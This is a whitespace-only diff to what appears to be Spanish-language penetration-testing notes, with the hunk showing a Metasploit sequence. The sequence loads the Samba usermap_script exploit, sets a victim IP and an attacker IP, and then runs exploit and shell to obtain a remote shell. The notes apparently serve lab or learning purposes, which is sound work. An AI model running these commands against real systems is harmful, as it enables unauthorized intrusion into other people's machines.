@@ -148,7 +148,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 	❯ use exploit/multi/samba/usermap_script       # Usamos el exploit
 	❯ options
 	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
-	❯ set LHOST 192.168.1.157                     # Colocamos la IP de nuestra maquina 
+	❯ set LHOST 192.168.1.157                      # Colocamos la IP de nuestra maquina 
 	❯ exploit 
 	❯ shell 
 ```
